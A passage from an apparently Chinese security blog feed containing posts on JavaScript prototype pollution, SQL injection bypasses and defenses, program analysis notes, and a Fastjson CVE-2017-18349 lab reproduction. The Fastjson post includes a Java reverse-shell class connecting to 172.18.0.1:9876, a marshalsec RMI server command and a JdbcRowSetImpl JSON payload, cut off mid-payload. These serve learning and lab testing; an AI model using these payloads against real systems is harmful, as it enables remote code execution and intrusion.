问：原型链污染的概念是什么？</font></p><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p><p>基本原理：引用类型的属性被所有实例共享。案例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.names = [<span class="string">&#x27;kevin&#x27;</span>, <span class="string">&#x27;daisy&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child1 = <span class="keyword">new</span> Child();</span><br><span class="line">child1.names.push(<span class="string">&#x27;yayu&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(child1.names); <span class="comment">// [&quot;kevin&quot;, &quot;daisy&quot;, &quot;yayu&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child2 = <span class="keyword">new</span> Child();</span><br><span class="line"><span class="built_in">console</span>.log(child2.names); <span class="comment">// [&quot;kevin&quot;, &quot;daisy&quot;, &quot;yayu&quot;]</span></span><br></pre></td></tr></table></figure><p>按照 Java 中正常的继承，child2.names 应该和原对象一样，数组中只有 2 个数据。</p><h1 id="2-利用"><a href="#2-利用" class="headerlink" title="2 利用"></a>2 利用</h1><p><font color="red">问：怎么判断是否有原型链污染？</font></p><ul><li>字符串可以被解析为方法或对象。例如：Json.parse 进行解析、shvl 库使用点对属性操作。</li><li>对象的键和值都可控。target[key] = value，其中 key 和 value 均可控制。</li></ul><p>下面是一个原型链污染的简单案例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;merge&#x27;</span>, target, source);</span><br><span class="line">    <span class="comment">// 遍历 source 中的 key。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;         <span class="comment">// &#123;&#125; 是一个对象，存在 __proto__ 的 key。</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(o1));</span><br><span class="line"><span class="built_in">console</span>.log(o1);    <span class="comment">// object</span></span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(o2));</span><br><span class="line"><span class="built_in">console</span>.log(o2);    <span class="comment">// object</span></span><br><span class="line"></span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;o1 proto:&#x27;</span>, o1.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;o2 proto:&#x27;</span>, o2.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;&#123;&#125; proto:&#x27;</span>, &#123;&#125;.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(o1, o2);    <span class="comment">// 对象 &#123;&#125; 的原型对象变为 &#123; a: 1 &#125;。</span></span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3)</span><br></pre></td></tr></table></figure><p>实战1:在 antCTF 中，使用 shvl 库对键值进行操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">email: <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> contents = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.keys(req.body).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">      shvl.set(contents, key, req.body[key]);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 遍历请求参数中所有的 key</span></span><br><span class="line">    <span class="comment">// 将键和值赋值为 contents（shvl 库的 set 函数）</span></span><br><span class="line"></span><br><span class="line">    contents.from = <span class="string">&#x27;&quot;admin&quot; &lt;admin@8-bit.pub&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> send(contents);</span><br><span class="line">      <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">        message: <span class="string">&quot;Success.&quot;</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.status(<span class="number">500</span>).json(&#123;</span><br><span class="line">        message: err.message</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><font color="red">问：常见的原型链污染方法有哪些？</font></p><ul><li><code>function.__proto__.polluted</code>。</li><li><code>function.prototype.polluted</code>。</li><li><code>obj.__proto__.pollluted</code>。例如：shvl 只禁用了 <code>__proto__</code>，传送门<a href="https://github.com/robinvdvleuten/shvl/pull/35">Security Fix for Prototype Pollution - huntr.dev</a></li><li><code>obj.constructor.polluted</code>。</li></ul><p>案例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">fullName</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.fullName = fullName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> person(<span class="string">&quot;Satoshi&quot;</span>);</span><br><span class="line"><span class="comment">// function：prototype, __prototype</span></span><br><span class="line">person.prototype.sayHello = <span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__);</span><br><span class="line">person.prototype.newConstant = <span class="number">2</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__); </span><br><span class="line"></span><br><span class="line"><span class="comment">// object: __prototype__, constructor</span></span><br><span class="line">person1.__proto__.sayHi= <span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__);</span><br><span class="line">person1.constructor.prototype.oldConstant = <span class="number">4</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">person &#123; sayHello: 1 &#125;</span></span><br><span class="line"><span class="comment">person &#123; sayHello: 1, newConstant: 2 &#125;</span></span><br><span class="line"><span class="comment">person &#123; sayHello: 1, newConstant: 2, sayHi: 3 &#125;</span></span><br><span class="line"><span class="comment">person &#123; sayHello: 1, newConstant: 2, sayHi: 3, oldConstant: 4 &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><blockquote><p>推荐一个非常 nice 的网站：<a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a> 。收集 hack 中的 tricks</p></blockquote><hr><p><font color="red">问：原型链污染链怎么挖掘？</font></p><ol><li>寻找 JavaScript 中的危险关键字（危险函数）。如：<ol><li>模块：child_process</li><li>函数：eval, spwn, exec, setTimeout, setInteval, Function</li></ol></li><li>寻找调用关系，并且确定可控的参数。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210313142208.png"><br>（图片说明：先确认危险函数和调用方式，也就是头部和尾部，再去寻找中间过程）</li><li>充分利用危险函数和能控制的参数。（读取文件或者反弹 shell）</li></ol><ul><li>目标机器环境如果有 bash，可以反弹 shell。</li><li>目标机器环境如果有 Python 等，可以反弹 shell。</li><li>目标机器环境如果只有 sh，将 readflag 执行写入到其他地方，再利用其他方式读取。</li></ul><p>（拓展阅读：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">反弹Shell表</a>）</p><p><font color="red">问：原型链污染怎么防御？怎么绕过防御呢？</font></p><ul><li>如果系统中有键值的操作，并且键和值来自外部输入。可以考虑进行过滤：<ul><li>禁止操作 <code>constructor</code></li><li>禁止操作 <code>prototype</code></li><li>禁止操作 <code>__proto__</code></li></ul></li></ul><p>绕过防御：</p><ul><li>思考并测试是否过滤完全，具体参考 antCTF 的 8-bit-pub 中的 shvl 库绕过。</li></ul><p>参考教程：</p><ol><li><a href="https://github.com/mqyqingfeng/Blog/issues/16">JavaScript深入之继承的多种方式和优缺点-Github</a></li><li><a href="https://www.huaweicloud.com/articles/588bbccfd343112b66fba197a74dd245.html">JS中的prototype、__proto__与constructor-Huawei</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF">继承与原型链 - JavaScript | MDN</a></li><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击-phithon</a></li><li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#basic-example">NodeJS - <strong>proto</strong> &amp; prototype Pollution-HackTricks</a></li><li><a href="https://zhuanlan.zhihu.com/p/355840263">AntCTF2021部分WP-HapHp1</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】SQL注入总结</title>
      <link href="d3de666e8195/"/>
      <url>d3de666e8195/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>SQL 注入是一种常见的通用漏洞，在 CTF 中也是常客。</p><blockquote><p>我对于通用漏洞的理解：和任何框架没有关系，和任何语言没有关系。</p></blockquote><p>曾经做完 sqli-lab 的我非常的天真，想尝试把 SQL 注入漏洞进行系统性的总结归档，我发现，这真的太难太难了。</p><p>所以就有了现在这篇文章，采用问答的方式，记录一些自己遇到和收集的 SQL 注入的思想，让自己能在遇到具体问题时进行具体的分析。</p><hr><h1 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1 基本原理"></a>1 基本原理</h1><p>将用户输入的参数当作 SQL 语句执行。</p><blockquote><p>更好的解释：用户输入的参数可以改变 SQL 的语法或语义。</p></blockquote><h1 id="2-防御与利用"><a href="#2-防御与利用" class="headerlink" title="2 防御与利用"></a>2 防御与利用</h1><blockquote><p>攻与防不能独立的看待，需要根据实际的问题去解决。例如：使用 addslashes 能防御 SQL 注入，但是在某些特殊情况又可以进行绕过（如：宽字节注入、数组注入），但是用一些简单的方法又能防御掉这些绕过（如：set UTF-8、类型检查）。</p></blockquote><hr><p><font color="red">问：如何检测 SQL 注入？</font></p><p>无源码：</p><ol><li>使用 SQLmap 跑一下。</li><li>使用常见的<a href="https://slug01sh.github.io/2021%E5%B9%B41%E6%9C%8818%E6%97%A5-sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/#2-%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F">闭合方式</a> fuzz 一下。</li><li>手动闭合？不推荐，测试不完全。</li></ol><p>有源码：</p><ol><li>中型代码<ol><li>查看 SQL 语句编写是否规范（具体请查看后文的防御方式）。如：</li><li>查看官方文档是否有自动类型转换，构造数组或其他数据类型绕过。如：<a href="">AntCTF 8-bit-pub</a></li></ol></li><li>小型代码：搜集 tricks，逐个分析以及测试。</li></ol><hr><p><font color="red">问：怎么绕过 addslashes？</font></p><ol><li>利用宽字节注入。（正常运行函数）</li></ol><ul><li>条件：MySQL 的编码为 GBK。</li><li>原理：PHP 对字符的编码为 UTF-8，<code>%27</code> 为 <code>&#39;</code>，<code>%5c</code> 为反斜杠，<code>%df</code> 无字符。当给 PHP 发送 <code>%df%27</code> 时，PHP 会将引号进行转义，转义为 <code>%df%5c%27</code>。经过转义后的字符在 UTF-8 下是安全的，但是在 GBK 中 <code>%df%5c</code> 会转义为 <code>運</code> 字，而引号并没有被转义。</li><li>修复：（参考：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html#004">浅析白盒审计中的字符编码及SQL注入-PHITHON</a>）<ul><li>调用一下 mysql_set_charset 函数，设置当前连接的字符集为 GBK。使用 mysql_real_escape_string 进一步过滤。</li><li>设置 GBK 之后，设置 character_set_client=BINARY。</li><li>使用 PDO（PHP Data Object）。如果 PHP &lt; 3.6，禁用 PHP 仿真预编译。</li></ul></li></ul><ol start="2"><li>利用特殊类型进行绕过（不正常运行函数）</li></ol><ul><li>条件：能控制传入参数的数据类型。$_GET[“a”] 可能为数组。</li><li>原理：addslashes 只能处理字符串</li></ul><hr><p><font color="red">问：SQL 注入有哪些利用方法？</font></p><p>基本功能：</p><ol><li>任意账户登陆。（有些转义函数可能无法实现完全可控，例如：antCTF的8-bit-pub）。</li><li>数据库读取。</li></ol><p>进阶功能：</p><ol><li>系统文件读取。</li><li>系统文件写入，即写 Webshell。</li><li>执行命令。</li></ol><hr><p><font color="red">问：过滤关键字如何绕过？</font></p><p>方法1:双写绕过</p><ul><li>条件：将过滤字符删除，只删除一次（没有进行递归删除）。</li><li>原理：删除之后的字符串可以形成新的关键字 an<code>and</code>d。</li></ul><p>方法2:大小写绕过</p><ul><li>条件：使用正则表达式进行匹配，但是没有使用 <code>/i</code></li><li>原理：大部分数据库对大小写不敏感。</li></ul><hr><p><font color="red">问：在数据库的报错信息中，如何显示自己需要的字符串？</font></p><blockquote><p>2020 年 n1ctf 中 Web-SignIn 一题中用到</p></blockquote><ul><li>exp()函数</li></ul><hr><p><font color="red">问：在做白盒审计时，如何快速定位是否存在 SQL 注入？</font></p><ul><li>全局搜索关键字：select、query、db、sql等。<ul><li>宽字节注入：GBK</li><li>二次 urldecode 注入：urldecode, rawurldecode</li></ul></li><li>查看所使用的库文档，找文档的 escape。</li></ul><hr><p><font color="red">问：常见的 SQL 注入的防御方法有哪些？</font></p><ol><li>GPC/runtime 函数过滤（部分防御 SQL 注入，具体参考《代码审计》一书）。<ol><li>GPC 负责对 GET，POST，Cookie 过滤。</li><li>runtime 负责对文件过滤。</li></ol></li><li>过滤函数和类<ol><li>addslashes 函数（addslashes 不知道任何有关 MySQL连接 的字符集，转义后更有可能导致错误）</li><li>mysql_real_escape_string 函数</li><li>intval 函数</li></ol></li><li>PDO 预编译</li></ol><hr><p><font color="red">问：预编译的方法怎么绕过？</font></p><p>方法1:</p><ul><li>条件：将用户输入的参数直接写入预编译语句。</li><li>原理：预编译是数据库提供的功能，分为 prepare 和 execute。prepare 是将需要执行的语句（不带数据）发送数据库，数据库进行词法分析、语法分析、语义分析，固定执行的具体流程。execute 将数据发送给数据库，发送的数据只能被作为字符串处理，无法改变 SQL 语句的执行流程。</li></ul><p>方法2:</p><ul><li>条件：模拟预编译。</li><li>原理：PHP 的模拟预编译的实质是转义，也就是调用 <code>mysql_real_escape_string</code> 函数进行转义。</li></ul><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】程序分析总结</title>
      <link href="016f20c17d1b/"/>
      <url>016f20c17d1b/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>前几天面试阿里的 SDL 部门，面试小姐姐人非常好。大致给我讲了里面工作的大致分类。</p><ul><li>白盒审计：</li><li>黑盒测试</li></ul><p>我也基本确定了自己的发展方向，CTF 的内容也偏向于这方面，以后的主要学习内容都尽量偏向于这两个方向。</p><blockquote><p>我深知，技术是为了解决问题而生，各种各样的技术会不断进步，永远是学不完的。我需要积淀自己的核心能力。</p></blockquote><p>后面的内容是学习了南京大学的《软件分析》课程之后，思考总结的笔记。</p><h1 id="1-第一课"><a href="#1-第一课" class="headerlink" title="1 第一课"></a>1 第一课</h1><p><font color="red">0x01 Program Language、编译原理、程序分析、静态分析、动态分析的关系是什么？</font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    classDef default fill: orange;</span><br><span class="line">    id1(Program Language);</span><br><span class="line">    id2(编译原理);</span><br><span class="line">    id3(程序分析);</span><br><span class="line">    id4(静态分析);</span><br><span class="line">    id5(动态分析);</span><br><span class="line">    id1--&gt;id2 &amp; id3;</span><br><span class="line">    id2--&gt;id4</span><br><span class="line">    id3--&gt;id4 &amp; id5;</span><br></pre></td></tr></table></figure><p>（图片说明：也就是说程序分析和编译原理都处于 PL 的一个小分支，编译原理更偏向于静态分析）</p><ul><li>PL：即 Program Language，是研究编程语言的一个领域，编译原理和程序分析都只是其中的研究方向。</li><li>编译原理：高级编程语言翻译成机器代码的科学技术。</li><li>程序分析：自动分析程序的包括正确性、健壮性、安全性和活跃性等特征的过程。</li><li>静态分析：在代码未运行时，进行代码特征分析的方法。在编译原理中会使用到静态词法分析、语法分析、语义分析。</li><li>动态分析：在代码执行时，进行分析。</li></ul><p><font color="red">0x02 soundness（稳健）、completeness（完整）、false negatives（假阴性、漏报率）、false positives（假阳性、错报率）</font></p><p>soundness 和 completeness 都是用来描述程序分析最后结果的形容词。</p><ul><li>soundness 代表把所有的异常都找到，但是有假阴性。</li><li>completeness 代表找到的异常都是真实存在的，但是有些异常没有找到</li></ul><p>soundness 和 completeness 也就有了不同的衡量指标：</p><ul><li>假阴性（漏报率）：只要感染病毒，核酸检测就应该是阳性；如果检查是阴性，就说明没有感染新冠肺炎。 然而，事实并不是这样的。 一些患者是新型冠状病毒感染者，但是核酸检测报告阴性，我们把这种情况称之为“假阴性”。只会存在于 soundness。</li><li>假阳性（错报率）：没患病但是检测出来患病，就是假阳性。只会用来描述 completeness。</li></ul><p>单从「漏」和「错」来看，我会认为错报率更严重，但实际来看漏洞才是最危险的，「漏报」就很容易导致进一步导致病毒进一步传播，对于程序分析亦是如此，「漏报」就有更大的概率导致出现安全隐患。</p><p>我们在研究的时候，通常是先保证 soundness，然后在 soundness 的基础上提高精度（减少误报率）和速度。</p><hr><p><font color="red">0x03 如何理解 abstraction（抽象） 和 over-approximation（近似）？</font></p><p>抽象和近似，是静态分析中常用的两种技术手段。</p><ul><li>抽象：对情景进行提炼和总结，抽象出关键词（0、1、unknown、undefined）。</li><li>近似：利用转换函数（可以进行分类的函数）、分析控制流来将代码中的要素归类到前面抽象的关键词中。</li></ul><hr><p>参考文章：</p><ol><li><a href="http://www.jos.org.cn/html/2019/1/5651.htm#outline_anchor_11">程序分析研究进展</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 污点分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】CVE-2017-18349：Fastjson 任意代码执行</title>
      <link href="f8dd72d9678b/"/>
      <url>f8dd72d9678b/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>Fastjson 是一个阿里巴巴的开源 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p><h1 id="0x02-漏洞概述"><a href="#0x02-漏洞概述" class="headerlink" title="0x02 漏洞概述"></a>0x02 漏洞概述</h1><p><strong>编号：CVE-2017-18349</strong></p><p>Fastjson 提供了 autotype 功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，其次，Fastjson 自定义的反序列化机制时会调用指定类中的 setter 方法及部分 getter 方法，那么当组件开启了 autotype 功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定 setter 或者 getter 方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的“Gadget”），则会造成一些严重的安全问题。并且在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启 autotype 功能的绕过。</p><h1 id="0x03-影响版本"><a href="#0x03-影响版本" class="headerlink" title="0x03 影响版本"></a>0x03 影响版本</h1><p>Fastjson1.2.47以及之前的所有版本</p><h1 id="0x04-环境搭建"><a href="#0x04-环境搭建" class="headerlink" title="0x04 环境搭建"></a>0x04 环境搭建</h1><ol><li><p>启动环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下载 vulhub</span></span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动</span></span><br><span class="line">cd vulhub/fastjson/1.2.47-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></li><li><p>判断是否正常启动。访问<code>http://127.0.0.1:8090</code>，会返回一个 Json 串，如下图所示：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210304172714.png"></p></li></ol><h1 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h1><blockquote><p>主机IP：172.18.0.1</p><p>靶机IP：172.18.0.2</p></blockquote><ol><li><font color="red">编译反弹 shell 恶意代码</font><blockquote><p>注意⚠️：将本地的 JDK 切换到 <code>openjdk:8u102</code></p></blockquote></li></ol><p>创建恶意代码 <code>Exploit.java</code> 文件，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Runtime</span><br><span class="line">        .getRuntime()</span><br><span class="line">        .exec(</span><br><span class="line">          <span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/172.18.0.1/9876 0&gt;&amp;1&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">    Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>javac Exploit.java</code> 进行编译。(记得修改上面的为自己的主机 ip 地址)</p><ol start="2"><li><font color="red">搭建 Web 服务，让<strong>目标靶机</strong>可以访问。</font></li></ol><p>在 class 路径下执行 <code>python3 -m http.server 8081</code> 即可。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210305130108.png"></p><ol start="3"><li><font color="red">使用 marshalsec 搭建 RMI（Remote Method Invoke）环境.在 java 反序列化时，利用序列化数据造成代码执行攻击。</font></li></ol><p>先编译 marshalsec</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"><span class="built_in">cd</span> marshalsec </span><br><span class="line">mvn clean package -DskipTests <span class="comment"># 使用 maven 编译</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译后进入 <code>target</code> 目录，并使用下面的命令启动 RMI 服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://172.18.0.1:8081/#Exploit&quot;</span> 9999</span><br></pre></td></tr></table></figure><blockquote><p>这里的 URL <code>http://172.18.0.1:8081/#Exploit</code> 有几个关键的要素：</p><ol><li>目标靶机可以访问到 IP 地址（我的主机地址为 <code>172.18.0.1</code>，我的靶机地址为 <code>172.18.0.2</code>，在同一个内网中）。除非 Fastjson 搭建在本地环境，否则不要使用 <code>127.0.0.1</code></li><li>Web 服务下载 Exploit.class 的 URL 为 <code>http://172.18.0.1:8081/Exploit.class</code>，在命令行中需要改写为 <code>http://172.18.0.1:8081/#Exploit</code></li></ol></blockquote><ol start="4"><li><font color="red">使用 Burpsuite 修改 GET 为 POST，并发送 exp。</font></li></ol><p>exp:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;a&quot;</span>:&#123;</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;val&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">&quot;b&quot;</span>:&#123;</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://172.18.0.1:9999/Exploit&quot;</span>,</span><br><span class="line"></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span>:<span 